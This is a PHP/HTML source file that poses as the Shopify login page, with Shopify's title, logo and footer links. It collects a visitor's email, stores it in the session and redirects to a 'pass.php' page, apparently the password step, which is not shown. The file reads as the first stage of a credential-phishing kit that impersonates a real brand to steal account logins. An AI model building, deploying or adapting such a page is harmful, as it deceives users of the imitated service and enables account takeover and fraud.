<?php
    session_start();
    $error_msg = "";

    if($_SERVER['REQUEST_METHOD'] == 'POST')
    {
        $user = htmlspecialchars($_POST['username']);
        $pattern = "/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/";

        if(empty($user))
        { 
            $error_msg = "Enter your email or mobile phone number";
        }                    
        else if(!preg_match($pattern, $user))
        {
            $error_msg = "Enter a valid email address";
        }
        else
        {
            $_SESSION['username'] = $user;
            {
                header("Refresh:0; url=pass.php");
                exit();
            }
        }
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in — Shopify</title>
    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon" href="S.webp" type="image/x-icon">
</head>
<body>
    <main>
        <div class="main_con">
            <header>
                <a href="https://www.shopify.com/">
                    <img src="Shopify_logo.svg.png" alt="Shopify" width="92px" height="26px">
                </a>
            </header>
            <div class="form-div">
                <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">      
                    <h1>Log in</h1>
                    <h3>Continue with spotify</h3>
                    
                    <label >Email</label>
                    <br>
                    <input type="text" name="username" size="60" id="username">
                    <div class="error_msg">
                        <?php echo $error_msg; ?>
                    </div>
                    <br>
                    <input type="submit" value="Continue with email" id="continue" >
                </form>
            </div>
            <br><br>
            <div class="sign-options">
                <div class="component">
                    <img src="applelogo.png" alt="Apple" width="50" height="30">
                </div>
                <div class="component">
                    <img src="googlelogo.jpeg" alt="Google" width="30" height="30">
                </div>
                <div class="component">
                    <img src="facebooklogo.jpeg" alt="Facebook" width="30" height="30">
                </div>
            </div>
            <div class="create-acc">
                <span>New to Shopify?</span>
                <span class="acc"><a href="https://accounts.shopify.com/signup?rid=efaef73c-fd7b-4b4e-8d25-1a0c0fece91f">Get Started</a></span>
            </div>
            <div class="foot">
                <div class="foot-components"><a href="https://help.shopify.com/en/manual/your-account/logging-in#desktop">Help</a></div>
                <div class="foot-components"><a href="https://www.shopify.com/legal/privacy">Privacy</a></div>
                <div class="foot-components"><a href="https://www.shopify.com/legal/terms">Terms</a></div>
            </div>
        </div>
    </main>
</body>
</html>